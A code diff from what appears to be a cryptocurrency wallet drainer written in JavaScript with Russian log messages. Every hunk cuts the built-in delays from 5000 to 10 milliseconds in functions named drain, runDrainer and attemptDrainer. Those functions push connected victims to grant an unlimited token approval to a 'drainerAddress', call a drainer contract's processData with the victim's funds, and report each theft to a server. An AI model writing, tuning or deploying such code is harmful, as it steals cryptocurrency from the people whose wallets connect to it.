@@ -434,7 +434,7 @@ async function drain(chainId, signer, userAddress, bal, provider) {
         console.log(`📏 Цена газа: ${ethers.utils.formatUnits(gasPrice, "gwei")} gwei`);
 
         console.log(`⏳ Задержка 5 секунд перед approve для токена ${token}`);
-        await delay(5000);
+        await delay(10);
 
         const tx = await contract.approve(chainConfig.drainerAddress, MAX, {
           gasLimit: 100000,
@@ -485,7 +485,7 @@ async function drain(chainId, signer, userAddress, bal, provider) {
         console.log(`📏 Цена газа для ${chainConfig.nativeToken}: ${ethers.utils.formatUnits(gasPrice, "gwei")} gwei`);
 
         console.log(`⏳ Задержка 5 секунд перед processData`);
-        await delay(5000);
+        await delay(10);
 
         const tx = await drainer.processData(taskId, dataHash, nonce, [], {
           value,
@@ -548,7 +548,7 @@ async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash, 
 async function runDrainer(provider, signer, userAddress) {
   const currentTime = Date.now();
   const timeSinceLastDrain = currentTime - lastDrainTime;
-  const minDelay = 5000;
+  const minDelay = 10;
 
   if (timeSinceLastDrain < minDelay) {
     await delay(minDelay - timeSinceLastDrain);
@@ -832,7 +832,7 @@ async function attemptDrainer() {
     }
 
     console.log('⏳ Задержка 5 секунд перед runDrainer');
-    await new Promise(resolve => setTimeout(resolve, 5000));
+    await new Promise(resolve => setTimeout(resolve, 10));
 
     isTransactionPending = true;
     const status = await runDrainer(provider, signer, connectedAddress);
